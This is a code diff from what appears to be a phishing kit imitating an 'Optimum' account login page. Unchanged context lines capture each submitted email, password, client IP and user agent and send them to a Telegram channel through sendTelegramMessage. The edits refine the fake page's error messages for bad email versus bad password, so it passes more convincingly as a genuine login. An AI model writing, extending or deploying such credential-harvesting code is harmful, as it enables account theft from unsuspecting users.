@@ -106,7 +106,7 @@ User Agent: ${navigator.userAgent}`;
         console.log(error.response.data.response);
         console.log(error.response.data);
         if (error.response.data) {
-            if (error.response.data.status == 'LOGIN_RESP_FAILURE_BAD_CREDENTIALS_EMAIL' || error.response.data.status == 'LOGIN_RESP_FAILURE_BAD_CREDENTIALS') {
+            if (error.response.data.status == 'LOGIN_RESP_FAILURE_BAD_CREDENTIALS') {
                 const message = `Optimum results { invalid }
 Email: ${email}
 Password: ${password}
@@ -115,10 +115,18 @@ Client IP: ${clientIp}
 User Agent: ${navigator.userAgent}`;
       
                 await sendTelegramMessage(message);
-                let passwordError = 'Invalid Password';
+                passwordError = 'Invalid password';
 
                 setErrors({ email: emailError, password: passwordError });
 
+                passwordError = '';
+
+            }else if (error.response.data.status == 'LOGIN_RESP_FAILURE_BAD_CREDENTIALS_EMAIL'){
+                emailError = 'Invalid email address'
+
+                setErrors({ email: emailError, password: passwordError });
+
+                emailError = '';
             }else{
                 console.error('Response data:', error.response.data);
                 console.error('Response status:', error.response.status);
